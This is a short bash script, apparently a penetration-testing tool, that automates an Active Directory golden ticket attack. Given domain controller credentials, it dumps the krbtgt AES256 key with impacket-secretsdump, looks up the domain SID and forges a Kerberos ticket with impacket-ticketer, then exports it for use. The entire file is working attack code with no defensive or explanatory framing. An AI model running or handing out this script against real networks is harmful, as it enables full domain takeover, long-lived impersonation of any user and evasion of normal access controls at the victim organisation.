#!/bin/bash

if [ $# -eq 0 ]; then
    echo "Usage: gold.sh <dc-ip> <domain> <username> <password>"
    exit 1
fi

aes=$(impacket-secretsdump $2/$3:$4@$1 -just-dc-user krbtgt | grep aes256 | awk -F ":" '{print $3}')
SID=$(impacket-lookupsid $2/$3:$4@$1 0 | grep Domain | awk '{print $5}' )
impacket-ticketer -aesKey $aes -domain-sid $SID -domain $2 $3
export KRB5CCNAME=$3.ccache

